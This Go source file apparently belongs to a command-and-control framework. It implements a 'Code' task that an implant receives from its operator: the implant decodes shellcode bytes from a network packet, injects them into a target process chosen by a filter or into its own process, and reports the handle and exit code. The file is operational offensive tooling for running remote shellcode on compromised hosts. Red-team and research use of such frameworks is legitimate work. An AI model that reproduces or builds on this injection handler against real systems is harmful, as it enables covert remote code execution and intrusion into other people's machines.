package task

import (
	"context"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Code is a struct that is similar to the 'cmd.Code' struct. This is used to Task a Client with running shellcode
// on devices. This struct has many of the functionallies of the standard 'cmd.Code' function. The
// 'SetParent' function will attempt to set the target that runs the shellcode. If none are specified, the shellcode
// will be injected into the current process.
type Code struct {
	Data    []byte
	Wait    bool
	Filter  *cmd.Filter
	Timeout time.Duration
}

// MarshalStream writes the data for this Code thread to the supplied Writer.
func (c Code) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(c.Wait); err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(c.Timeout)); err != nil {
		return err
	}
	if err := w.WriteBool(c.Filter != nil); err != nil {
		return err
	}
	if c.Filter != nil {
		if err := c.Filter.MarshalStream(w); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(c.Data); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Code thread from the supplied Reader.
func (c *Code) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&c.Wait); err != nil {
		return err
	}
	if err := r.ReadUint64((*uint64)(unsafe.Pointer(&c.Timeout))); err != nil {
		return err
	}
	f, err := r.Bool()
	if err != nil {
		return err
	}
	if f {
		c.Filter = new(cmd.Filter)
		if err := c.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if c.Data, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func code(x context.Context, p *com.Packet) (*com.Packet, error) {
	var c Code
	if err := c.UnmarshalStream(p); err != nil {
		return nil, err
	}
	z := cmd.NewCodeContext(x, c.Data)
	z.Timeout = c.Timeout
	z.SetParent(c.Filter)
	if err := z.Start(); err != nil {
		return nil, err
	}
	var (
		w    = new(com.Packet)
		h, _ = z.Handle()
	)
	if w.WriteUint64(uint64(h)); !c.Wait {
		w.WriteInt32(0)
		return w, nil
	}
	err := z.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		w.Clear()
		return nil, err
	}
	e, _ := z.ExitCode()
	w.WriteInt32(e)
	return w, nil
}
